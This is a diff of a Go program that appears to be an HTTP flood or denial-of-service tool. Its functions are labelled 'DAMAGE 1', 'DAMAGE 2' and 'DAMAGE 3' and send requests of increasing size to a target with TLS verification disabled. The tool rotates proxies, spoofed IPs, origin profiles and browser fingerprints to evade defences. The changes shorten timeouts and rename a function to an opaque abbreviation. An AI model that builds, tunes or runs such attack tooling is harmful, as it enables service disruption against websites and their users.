@@ -236,7 +236,7 @@ var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 // ================== DAMAGE 1 ==================
 func PMP(target string) int {
 client := &http.Client{
-Timeout: 7 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
@@ -267,7 +267,7 @@ return Berhasil
 // ================== DAMAGE 2 ==================
 func PMH(target string) int {
 client := &http.Client{
-Timeout: 7 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
@@ -294,7 +294,7 @@ return Berhasil
 // ================== DAMAGE 3 ==================
 func PHR(target string, ProxyX string) map[string]bool {
 client := &http.Client{
-Timeout: 7 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 parsedTarget, _ := url.Parse(target)
@@ -580,7 +580,7 @@ SecFetchSite string
 }
 
 // ================== ORIGIN PROF ==================
-func GetProfileForOrigin(origin string, host string) OriginProfile {
+func GPFO(origin string, host string) OriginProfile {
 switch origin {
 case "https://" + host:
 return OriginProfile{
@@ -822,7 +822,7 @@ FORIP := VIPS[rng.Intn(len(VIPS))]
 
 // ================== ORIGIN ==================
 SLOR := VORI[rng.Intn(len(VORI))]
-OPRF := GetProfileForOrigin(SLOR, host)
+OPRF := GPFO(SLOR, host)
 
 // ================== BROWSER ==================
 prof := PFS[rng.Intn(len(PFS))]
